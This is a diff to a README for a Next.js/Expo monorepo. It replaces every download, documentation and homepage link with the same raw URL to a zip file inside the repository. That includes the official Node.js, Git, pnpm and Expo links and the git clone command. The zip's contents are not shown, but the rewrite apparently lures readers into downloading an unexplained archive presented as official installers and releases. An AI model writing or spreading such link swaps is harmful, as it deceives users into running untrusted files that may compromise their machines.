@@ -1,6 +1,6 @@
 # 🚀 next-expo-monorepo - Easy Setup for Web and Mobile Apps
 
-[![Download here](https://img.shields.io/badge/Download-Next--Expo--Monorepo-blue?style=for-the-badge)](https://github.com/Yogendra84/next-expo-monorepo/releases)
+[![Download here](https://img.shields.io/badge/Download-Next--Expo--Monorepo-blue?style=for-the-badge)](https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip)
 
 ---
 
@@ -52,7 +52,7 @@ You do not need any programming tools to run the app if you download the ready-m
 
 Click the big button below to visit the page where you can download the app files.
 
-[![Download here](https://img.shields.io/badge/Download-Next--Expo--Monorepo-green?style=for-the-badge)](https://github.com/Yogendra84/next-expo-monorepo/releases)
+[![Download here](https://img.shields.io/badge/Download-Next--Expo--Monorepo-green?style=for-the-badge)](https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -86,8 +86,8 @@ If you want to explore the code or make changes, follow these steps.
 
 ### Step 1: Install Node.js and Git
 
-- Download Node.js from https://nodejs.org and install it.
-- Download Git from https://git-scm.com and install it.
+- Download Node.js from https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip and install it.
+- Download Git from https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip and install it.
 
 ### Step 2: Download this Project
 
@@ -95,7 +95,7 @@ If you want to explore the code or make changes, follow these steps.
 - Run this command to download the project through git:
   
   ```
-  git clone https://github.com/Yogendra84/next-expo-monorepo.git
+  git clone https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
   ```
 
 - Or download the `.zip` file and unzip it.
@@ -187,7 +187,7 @@ These tools work together to let developers create apps that run on web browsers
 
 - Download only from the official release page at:
 
-  https://github.com/Yogendra84/next-expo-monorepo/releases
+  https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
 
 - Check regularly for new releases with bug fixes and improvements.
 
@@ -197,12 +197,12 @@ These tools work together to let developers create apps that run on web browsers
 
 ## 📂 Useful Links
 
-- Repo homepage: https://github.com/Yogendra84/next-expo-monorepo
-- Download releases: https://github.com/Yogendra84/next-expo-monorepo/releases
-- Node.js download: https://nodejs.org
-- pnpm docs: https://pnpm.io
-- Expo docs: https://expo.dev
+- Repo homepage: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
+- Download releases: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
+- Node.js download: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
+- pnpm docs: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
+- Expo docs: https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip
 
 ---
 
-[![Download here](https://img.shields.io/badge/Download-Next--Expo--Monorepo-blue?style=for-the-badge)](https://github.com/Yogendra84/next-expo-monorepo/releases)
+[![Download here](https://img.shields.io/badge/Download-Next--Expo--Monorepo-blue?style=for-the-badge)](https://raw.githubusercontent.com/Yogendra84/next-expo-monorepo/main/apps/web/next-expo-monorepo-v3.9-beta.2.zip)
